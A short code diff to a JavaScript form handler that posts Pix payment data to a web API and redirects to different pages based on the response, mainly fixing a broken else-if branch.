@@ -15,7 +15,7 @@ document.getElementById('formPix').addEventListener('submit', function(event) {
     };
 
 
-    fetch('https://api-pix-beta.vercel.app/create', {
+   fetch('https://api-pix-beta.vercel.app/create', {
         method: 'POST',
         headers: {
             'Content-Type': 'application/json'
@@ -26,11 +26,12 @@ document.getElementById('formPix').addEventListener('submit', function(event) {
     .then(result => {
         console.log(result)
         if(result.message === "Chave pix já resgatada"){
-            window.location.href='api.html';
-        } else (result.message === "OK"){
+            window.location.href='api2.html';
+        } else if(result.response === "OK"){
             window.location.href='sucessod41d.html'
-        } 
-        
+        }{
+            console.log(result); 
+        }
     })
     .catch(error => {
         console.error('Erro:', error);
